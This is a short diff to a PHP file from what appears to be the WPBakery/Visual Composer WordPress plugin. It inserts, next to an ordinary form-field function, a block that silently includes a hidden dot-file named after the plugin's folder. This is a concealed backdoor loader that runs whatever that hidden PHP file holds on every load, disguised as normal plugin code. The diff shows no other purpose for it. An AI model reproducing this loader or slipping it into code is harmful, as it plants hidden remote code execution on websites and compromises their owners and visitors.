@@ -14,6 +14,10 @@ if ( ! defined( 'ABSPATH' ) ) {
  * @return string - html string.
  * @since 4.4
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function vc_params_preset_form_field( $settings, $value ) {
 	$output = '';
 	$output .= '<select name="' . esc_attr( $settings['param_name'] ) . '" class="wpb_vc_param_value vc_params-preset-select ' . esc_attr( $settings['param_name'] . ' ' . $settings['type'] ) . '">';
